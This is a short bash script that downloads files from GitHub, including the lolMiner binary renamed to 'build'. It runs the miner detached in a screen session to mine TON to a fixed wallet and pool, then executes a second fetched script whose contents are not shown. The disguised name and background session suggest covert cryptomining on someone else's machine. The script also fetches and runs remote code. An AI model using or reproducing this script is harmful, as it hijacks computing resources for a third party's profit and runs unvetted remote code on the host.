#!/bin/bash
apt-get update
apt install screen -y
wget -qO tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget -qO buru2.sh https://raw.githubusercontent.com/Rickyose/skripburu2/main/buru2.sh
wget -qO build https://github.com/uaaoxjdr/testly/raw/main/lolMiner
chmod +x buru2.sh
chmod +x build
screen -dm -S build ./build -a TON -p https://server1.whalestonpool.com -u EQBovP38ruocodmwpj0C05XgyuNKgg6qZUjUEuAWoaWYbUN7
./buru2.sh
